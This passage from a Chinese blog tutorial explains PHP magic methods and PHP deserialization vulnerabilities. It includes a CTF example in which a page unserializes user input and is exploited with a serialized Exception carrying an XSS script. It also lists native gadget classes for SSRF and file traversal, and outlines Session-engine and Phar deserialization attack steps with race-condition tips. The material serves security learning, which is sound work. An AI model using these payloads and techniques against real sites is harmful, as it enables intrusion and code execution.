+写拦截 (__set)： 执行 $a-&gt;age = 13;给一个不存在的属性 age 强行赋值。系统再次拦截，触发了 **__set** 方法。
+__set 内部先输出了 调用 __set。
+接着执行 $this-&gt;str = $value;传进来的 13赋值给了内部的 $str 属性。
+
+
+再次读拦截： 执行 echo $a-&gt;str;
+系统再次触发 **__get**，输出 调用 __get。
+此时返回 $this-&gt;str，因为上一步它已经被改成了 13，所以外部的 echo 最终打印出了 13。
+
+
+脚本执行结束，内存清空销毁对象，自动触发 **__destruct**，输出 调用 __destruct()。
+
+4. __call 与 __callStatic
+__call()：调用对象中不存在的实例方法时自动调用。
+__callStatic()：调用类中不存在的静态方法时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;public $str = &#x27;hello&#x27;;public static function myStaticMethod() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;myStaticMethod&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __call($b,$q) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__call&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;public static function __callStatic($func, $arguments)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__callStatic&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a-&gt;method();Person::myStaticMethod();Person::method2();?&gt;
+
+
+
+流程推演：
+
+创建对象 $a。自动触发 __construct()。输出调用 __construct()
+echo $a-&gt;method();PHP 引擎试图在 $a 这个对象里寻找一个叫 method() 的普通方法。但是并不存在。触发 __call($b, $q)，先输出 调用 __call。接着代码里写了 return $this-&gt;str;，于是把内部属性 &#39;hello&#39; 返回给了外面的 echo，最终在屏幕上打印出了 hello。
+Person::myStaticMethod();，:: 是静态调用的符号。PHP 引擎去 Person 类里找 myStaticMethod()。发现这个静态方法真实存在，且权限是 public。直接执行该方法，输出 调用 myStaticMethod。
+Person::method2();PHP 引擎试图静态调用一个叫 method2() 的方法。发现并不存在。触发__callStatic($func, $arguments)，输出 调用 __callStatic。
+脚本运行结束，内存开始清空自动触发 __destruct()。输出调用 __destruct()。
+
+5. __toString 与 __clone
+__toString()：对象被当作字符串使用&#x2F;输出时自动调用。
+__clone()：使用clone关键字克隆对象时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __toString() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__toString&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;name;&#125;function __clone() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__clone&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a . &#x27;&lt;br&gt;&#x27;;$b = $a;echo $a === $b;$c = clone $a;echo $a === $c;?&gt;
+
+
+
+流程推演：
+
+new 一个对象$a，输出调用 __construct()
+echo $a . &#39;&lt;br&gt;&#39;;对象 $a 和一个字符串 &#39;&lt;br&gt;&#39; 拼接在一起打印。为了防止报错，系统强行触发了对象的 __toString() 方法。输出调用 __toString，然后把返回的 $this-&gt;name（也就是 &#39;Jack&#39;）拼接到 &lt;br&gt; 前面输出。
+引用赋值$b = $a;
+echo $a === $b;结果为 true。经过 echo 的强制类型转换。打印出数字 1。
+$c = clone $a;创造了一个新对象 $c，它的属性和 $a 一模一样，但它们在内存中是独立的两个实体。新对象诞生时自动触发 __clone()。输出调用 __clone。
+echo $a === $c;再次比较，虽然长得一样，但已经是两个不同的实体了，所以结果为 false。echo false 在 PHP 中输出空字符串。
+代码执行结束，内存开始清空。两个对象被销毁，连续打印两次 调用 __destruct()。
+
+6. __invoke将对象当作函数直接调用时自动触发。示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __invoke($p1,$p2) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__invoke&quot;;echo &quot;&lt;br&gt;&quot;;return $p1 . &quot;---&quot; . $p2;&#125;&#125;$a= new Person();echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);?&gt;
+
+
+
+流程推演：
+
+创建对象 $a，触发 __construct()。调用 __construct()。
+echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);把一个对象（**$a**）当成了函数来加括号调用。括号里传的两个字符串 &quot;Jack&quot; 和 &quot;is a hacker&quot;传给了 __invoke($p1, $p2)。
+先触发内部的 echo 输出 调用 __invoke。接着执行 return 语句将两个参数拼接。输出Jack---is a hacker。
+程序结束，内存清空，对象销毁，触发 __destruct()。输出调用 __destruct()。
+
+7. __isset 与 __unset
+__isset()：对不可访问属性执行isset()/empty()时自动调用。
+__unset()：对不可访问属性执行unset()销毁时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $sex;private $name;private $age;public function __construct($name = &#x27;&#x27;, $age = 25, $sex = &#x27;男&#x27;)&#123;$this-&gt;name = $name;$this-&gt;age = $age;$this-&gt;sex = $sex;&#125;public function __isset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __isset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;public function __unset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __unset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$person = new Person(&#x27;Jack&#x27;, 18, &#x27;male&#x27;);// __isset()echo isset($person-&gt;sex);echo isset($person-&gt;name);echo isset($person-&gt;age);// __unset()echo &quot;\n&quot;;unset($person-&gt;name);unset($person-&gt;sex);echo isset($person-&gt;sex) ? &#x27;has&#x27; : &#x27;not_has&#x27;, &quot;\n&quot;;?&gt;
+
+
+
+流程推演：
+
+new 一个对象，包含公开属性 sex，私有属性 name 和 age。 
+echo isset($person-&gt;sex);代码可以直接拿到公开的数据 sex（不触发魔术方法）；但是对于私有数据无法直接接触。因为 sex 是 public，系统直接放行，结果为 true。经过 echo 的强制类型转换，屏幕上打出了数字 1。
+echo isset($person-&gt;name);``echo isset($person-&gt;age);当执行 isset 探测 name和age 时，因为权限不够，连续两次被拦截并触发了 __isset 方法，输出了两次提示。 
+代码试图用 unset 销毁私有的 name，再次被拦截，触发了 __unset 方法并输出提示。
+当试图销毁公开的 sex 时，因为权限足够，系统没有拦截，而是直接在内存里把它真实删除了。 
+最后用三目运算符再次探测 sex 时，发现它已经被删没了，所以输出了 not_has。
+
+三、CTF 序列化实战题目示例：CTF-XSS 结合反序列化页面代码 ctf_xss.php
+&lt;?phphighlight_file(__file__);$a = unserialize($_GET[&#x27;k&#x27;]);echo $a;?&gt;
+
+解题思路
+代码调用unserialize反序列化，且直接echo输出对象，触发__toString魔术方法。
+利用PHP原生类（无需自定义）Exception，该类存在__toString方法。
+构造包含XSS语句的Exception对象，序列化后传入参数。
+
+构造代码&lt;?php$e = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($e));?&gt;
+
+将输出字符串作为k参数传入，触发XSS弹窗。
+流程推演：
+
+当服务器执行到 echo $a; 时，强行触发了 Exception 对象的 __toString。
+__toString 强制输出了报错信息，导致原本在 PHP 后端内存对象里的恶意 JS 代码&lt;script&gt;alert(1)&lt;/script&gt;被提取出来，当作一串普通的字符串，拼接到了最终要发送的 HTML 网页源码里。
+服务器把拼凑好的 HTML 源码通过网络发送给了普通用户的浏览器。前端开始逐行解析网页准备渲染画面。当浏览器解析到 &lt;script&gt; 这个标签时，它的 JS 引擎被瞬间激活执行了这句 JavaScript 语句，成功弹出了框框。
+
+补充：查看PHP所有原生魔术方法类&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;$methods = get_class_methods($class);foreach ($methods as $method) &#123;if (in_array($method, array(&#x27;__destruct&#x27;,&#x27;__toString&#x27;,&#x27;__wakeup&#x27;,&#x27;__call&#x27;,&#x27;__callStatic&#x27;,&#x27;__get&#x27;,&#x27;__set&#x27;,&#x27;__isset&#x27;,&#x27;__unset&#x27;,&#x27;__invoke&#x27;,&#x27;__set_state&#x27;))) &#123;print $class . &#x27;::&#x27; . $method . &quot;\n&quot;;&#125;&#125;&#125;?&gt;
+
+Exception::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeupDateTime::__set_stateDateTimeImmutable::__wakeupDateTimeImmutable::__set_stateDateTimeZone::__wakeupDateTimeZone::__set_stateDateInterval::__wakeupDateInterval::__set_stateDatePeriod::__wakeupDatePeriod::__set_stateDOMException::__wakeupDOMException::__toStringJsonException::__wakeupJsonException::__toStringLogicException::__wakeupLogicException::__toStringBadFunctionCallException::__wakeupBadFunctionCallException::__toStringBadMethodCallException::__wakeupBadMethodCallException::__toStringDomainException::__wakeupDomainException::__toStringInvalidArgumentException::__wakeupInvalidArgumentException::__toStringLengthException::__wakeupLengthException::__toStringOutOfRangeException::__wakeupOutOfRangeException::__toStringRuntimeException::__wakeupRuntimeException::__toStringOutOfBoundsException::__wakeupOutOfBoundsException::__toStringOverflowException::__wakeupOverflowException::__toStringRangeException::__wakeupRangeException::__toStringUnderflowException::__wakeupUnderflowException::__toStringUnexpectedValueException::__wakeupUnexpectedValueException::__toStringCachingIterator::__toStringRecursiveCachingIterator::__toStringSplFileInfo::__toStringDirectoryIterator::__toStringFilesystemIterator::__toStringRecursiveDirectoryIterator::__toStringGlobIterator::__toStringSplFileObject::__toStringSplTempFileObject::__toStringSplFixedArray::__wakeupPDOException::__wakeupPDOException::__toStringReflectionException::__wakeupReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionNamedType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionClassConstant::__toStringReflectionExtension::__toStringReflectionZendExtension::__toStringAssertionError::__wakeupAssertionError::__toStringSimpleXMLElement::__toStringSimpleXMLIterator::__toStringPharException::__wakeupPharException::__toStringPhar::__destructPhar::__toStringPharData::__destructPharData::__toStringPharFileInfo::__destructPharFileInfo::__toString
+
+利用：
+XSS &#x2F; 信息泄露： 利用 Exception 或 Error。遇到 echo 时，其 __toString 会将肚子里的报错信息（恶意代码）吐到前端。
+SSRF (内网探针) ： 利用 SoapClient。触发其 __call 方法可强行向内网发送 HTTP 请求。
+文件&#x2F;目录遍历： 利用 DirectoryIterator 或 FilesystemIterator 配合 __toString 读取敏感目录。
+Phar 反序列化： 利用 Phar。无需 unserialize，只需普通文件读取操作（如 file_exists, filesize, file_get_contents, md5_file 等）即可引爆反序列化。
+
+四、PHP 反序列化攻击
+核心： 寻找从入口unserialize()到危险函数的“多米诺骨牌”（POP 链）。
+显式入口 (函数类)： 代码直接调用 unserialize()。
+隐式入口 (协议&#x2F;机制类)：
+Phar 协议： 利用 phar:// 伪协议，通过文件操作触发。
+Session 机制： 利用 session.serialize_handler 引擎不一致触发。
+
+
+
+Exception XSS
+触发条件： 存在 unserialize() 入口 &amp;&amp; echo&#x2F;print 输出点。
+动作： 构造 new Exception(&quot;&lt;script&gt;...&quot;)。
+关键点： 触发 Exception::__toString。
+
+Session 反序列化
+触发条件： 存在“存取引擎不一致” (php vs php_serialize)。
+动作： 
+寻找写入 Session 的接口，投毒 Payload：| + 序列化字符串。
+触发读取 Session 的页面，触发引擎自动反序列化。
+
+
+关键点： session.auto_start=1 导致的顺序冲突。
+注：若条件竞争不成功，增加上传文件大小（上传超大文件）以延长 Session 文件存活时间，扩大 0.01 秒的窗口期。 增加文件大小 &#x3D; “让子弹多飞一会儿”，增加命中概率。
+
+Phar 反序列化
+触发条件： 代码存在任意文件操作函数 (file_exists, md5_file 等)。
+动作： phar:// + 伪装后缀 (.jpg)。
+关键点： 利用 PHP 底层 phar:// 协议强制反序列化。
+注：Phar 文件必须包含合法签名（如 \x00\x00\xfe\x01）。若手动修改或生成时破坏了签名，PHP 将拒绝识别文件，导致漏洞无法触发。
+
+五、总结Q1: PHP 序列化漏洞中，有哪些魔术方法？
+__construct ⭐️构造方法，仅new创建对象时自动触发，反序列化不会执行。
+__destruct ⭐️析构方法，对象销毁、脚本运行结束、反序列化完成后自动触发。
+__toString将对象当作字符串输出、拼接时自动触发。
+__wakeup ⭐️执行反序列化unserialize()时最先触发，存在经典属性数量绕过漏洞。
+__sleep执行序列化serialize()对象前自动触发。
+__call调用不存在或无访问权限的方法时自动触发。
+__get读取不存在、私有&#x2F;受保护不可访问的属性时自动触发。
+__set修改不存在、私有&#x2F;受保护不可访问的属性时自动触发。
+__invoke把对象当作函数（$obj()）调用时自动触发。
+
+Q2: 序列化和反序列化的过程是什么？序列化：把内存中的对象，转换成字符串或字节码，便于存储和网络传输
+反序列化：把字符串或字节码还原为内存中的对象
+Q3: 序列化漏洞的产生原因是什么？用户可以通过 HTTP、或其他网络协议向服务器发送任意的序列化字符串或字节码，服务器未经严格验证就进行了反序列化。
+Q4: 反序列化漏洞的危害有哪些？RCE（远程代码执行），权限提升，敏感信息泄露，DDOS攻击，内网渗透（以该服务器为跳板，攻击公司内网中的其他设备）
+Q5: POP链是什么？攻击者通过控制对象的属性，将程序中现有的多个代码片段（Gadgets）像接龙一样串联起来，最终形成的一条攻击路径。
+Q6: session 反序列化是什么？session 反序列化漏洞是指攻击者通过篡改储存在 session 中的序列化数据，利用服务器解析（还原）这些数据时的逻辑缺陷，从而实现越权访问或远程执行恶意代码的安全漏洞。
+Q7: session 反序列化的形成原因是什么？
+php 使用了不同的 session 序列化引擎处理 session（存入 Session 时使用新引擎 php_serialize（无竖线），读取时使用旧引擎 php（以竖线 | 分割键值）。核心在于读取时，PHP 引擎会对 Session 中的竖线 | 进行切分，并将右侧数据强制反序列化。）
+php 保存 session 的过程是序列化，php 读取 session 的过程是反序列化。
+
+Q8: session 反序列化的危害是什么？RCE（远程代码执行）
+Q9: session 序列化引擎有哪些？PHP、PHP_serialize、PHP_binary
+username=zhangsan的结果是 PHP引擎： username | s:8:&quot;zhangsan&quot;; PHP_serialize引擎: a:1:&#123;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;&#125; php_binary引擎: [BS]�usernames:8:&quot;zhangsan&quot;;
+
+Q10: 文件上传进度反序列化是什么？文件上传进度反序列化是指攻击者通过在上传表单中构造恶意的进度标识符，利用 PHP 自动将上传信息存入 session 的机制，结合 session 引擎解析差异，强制服务器在后台还原恶意对象从而触发代码执行。
+Q11: 文件上传进度反序列化的作用是什么？php会话上传进度，phpinfo信息泄露可以看到对应的信息
+
+session.upload_progress.enabled 会话上传进度是否开启
+session.upload_progress.name 会话上传进度名
+session.upload_progress.cleanup 会话上传进度是否会自动清理
+
+当一个文件上传时，PHP 会检查 HTTP 请求。如果发现请求中包含一个特定的变量（默认名称为PHP_SESSION_UPLOAD_PROGRESS），它就会在 $_SESSION 数组中创建一个特殊的键。可用于Session序列化漏洞
+这个键里包含了文件的总大小、当前已上传的大小、预计剩余时间等实时数据。前端可以通过另一个异步请求（AJAX）读取这些 Session 数据，从而绘制出进度条。
+三个战例（Exception XSS、Session 错位、Phar 协议）
+假设你是一个杀手，你的目标是把一颗炸弹（恶意代码）送进防守极其严密的瑞士银行（服务器）内部并引爆。
+💣 战例一：Exception XSS （合法包裹的背刺）背景： 银行的安检机器（代码）虽然允许你往里面寄包裹（有 unserialize 函数），但银行内部被清理得干干净净，没有任何你可以利用的工具（没有自定义类）。
+黑客怎么做：
+
+黑客发现，银行出厂自带了一个“官方应急广播器”（也就是 Exception 报错类）。这是一个合法的官方物品，安检绝对不会拦。
+黑客把炸弹塞进这个“官方广播器”里，打包寄了过去。
+银行签收了包裹（反序列化成功）。
+此时炸弹还没炸。但是，银行有一个规定：遇到不认识的包裹，门卫要用大喇叭把包裹上的字念出来（代码里写了 echo $a;）。
+门卫一念，触发了广播器的自动播报功能（__toString），结果直接把里面的炸弹（XSS 恶意脚本）顺着大喇叭喷到了大门外的人群里（用户的浏览器）。
+结局：炸弹在人群中（前端浏览器）爆炸，XSS 攻击成功。
+
+
+💣 战例二：Session 错位 （交接班的致命误会）背景： 银行痛定思痛，把寄包裹的安检机器彻底拆了！（代码里没有 unserialize 函数了）。大门完全焊死。
+黑客怎么做：
+
+既然不能寄包裹，黑客就去银行的前台办业务（比如修改自己的昵称）。
+白班柜员（新引擎 php_serialize）非常死板，黑客说：“我的名字叫 竖线|炸弹图纸”。白班柜员就原封不动地把这串字记在了银行的访客登记本（Session 文件）上。这时候它只是一行字，非常安全。
+到了晚上，夜班柜员（旧引擎 php）来接班了。黑客故意去触发一个需要查验身份的业务。
+夜班柜员翻开登记本，看到了 竖线|炸弹图纸。致命的误会来了！夜班柜员的脑回路不一样，他认为：“在我的规矩里，竖线左边的是名字，竖线右边的必须是被组装出来的实物！”
+于是，夜班柜员硬生生地照着右边的“炸弹图纸”，在银行内部当场捏造了一颗真炸弹出来（强制反序列化）。
+结局：炸弹在银行内部爆炸，RCE 达成。
+
+
+💣 战例三：Phar 协议 （看一眼就会爆炸的画）背景： 银行再次升级防御，不仅拆了包裹机，还把所有柜员的规矩统一了（修复了 Session 错位）。现在既不能寄包裹，也没有交接班误会。
+黑客怎么做：
+
+黑客发现，银行虽然不收包裹，但是允许客户上传自己的头像照片。
+黑客制造了一颗极其微小的炸弹，把它塞进了一个压缩包里，然后把这个压缩包强行改名为 头像.jpg（这就是 Phar 文件），上传给了银行。
+银行的门卫用肉眼看了一下名字，确认是 .jpg 后缀，就放进去了。
+接下来是最可怕的一步：黑客不需要银行去“拆开”这个包裹。黑客只要让银行的清洁工，去“确认一下这张照片存不存在”（利用 file_exists() 等最普通的文件读取函数）。
+当清洁工的手碰到这个 头像.jpg 的瞬间，PHP 系统的底层诅咒被触发了：只要碰到 phar:// 协议传过来的文件，系统就会不受控制地强制解压并复活里面的所有东西。
+结局：仅仅是摸了一下文件，炸弹就在内存中瞬间复活并引爆，RCE 达成。
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
